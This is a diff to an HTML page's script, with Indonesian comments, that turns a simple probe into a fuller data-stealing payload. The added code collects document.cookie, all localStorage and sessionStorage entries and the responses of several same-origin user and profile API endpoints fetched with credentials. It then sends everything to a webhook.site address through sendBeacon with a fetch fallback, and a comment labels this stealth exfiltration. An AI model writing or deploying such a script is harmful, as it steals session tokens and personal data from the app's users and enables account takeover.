@@ -4,34 +4,79 @@
 <script>
 (async () => {
   try {
-    // coba akses endpoint internal (same-origin di WebView)
-    const endpoints = [
+    let results = [];
+
+    // helper aman
+    const safe = (label, data) => {
+      if (data) results.push(`=== ${label} ===\n${data}`);
+    };
+
+    // COOKIE
+    try {
+      safe("COOKIE", document.cookie);
+    } catch(e) {}
+
+    // LOCAL STORAGE
+    try {
+      let ls = "";
+      for (let i = 0; i < localStorage.length; i++) {
+        let k = localStorage.key(i);
+        ls += k + "=" + localStorage.getItem(k) + "\n";
+      }
+      safe("LOCALSTORAGE", ls);
+    } catch(e) {}
+
+    // SESSION STORAGE
+    try {
+      let ss = "";
+      for (let i = 0; i < sessionStorage.length; i++) {
+        let k = sessionStorage.key(i);
+        ss += k + "=" + sessionStorage.getItem(k) + "\n";
+      }
+      safe("SESSIONSTORAGE", ss);
+    } catch(e) {}
+
+    // endpoint probing (same-origin only)
+    const paths = [
       "/api/user",
       "/api/profile",
-      "/api/account"
+      "/api/account",
+      "/api/me",
+      "/user",
+      "/profile"
     ];
 
-    for (let url of endpoints) {
+    for (let p of paths) {
       try {
-        let res = await fetch(url, {
+        let r = await fetch(p, {
           credentials: "include",
           cache: "no-store"
         });
 
-        if (!res.ok) continue;
-
-        let data = await res.text();
-
-        // kirim ke webhook
-        navigator.sendBeacon(
-          "https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19",
-          new Blob([url + ":\n" + data], {type:"text/plain"})
-        );
-
+        if (r.ok) {
+          let t = await r.text();
+          safe(p, t.slice(0, 2000)); // batasi ukuran
+        }
       } catch(e) {}
     }
 
-  } catch (e) {}
+    // gabungkan hasil
+    const finalData = results.join("\n\n");
+
+    if (!finalData) return;
+
+    const blob = new Blob([finalData], {type:"text/plain"});
+
+    // exfil (stealth)
+    if (!navigator.sendBeacon("https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19", blob)) {
+      await fetch("https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19", {
+        method: "POST",
+        mode: "no-cors",
+        body: blob
+      });
+    }
+
+  } catch(e) {}
 })();
 </script>
 </body>
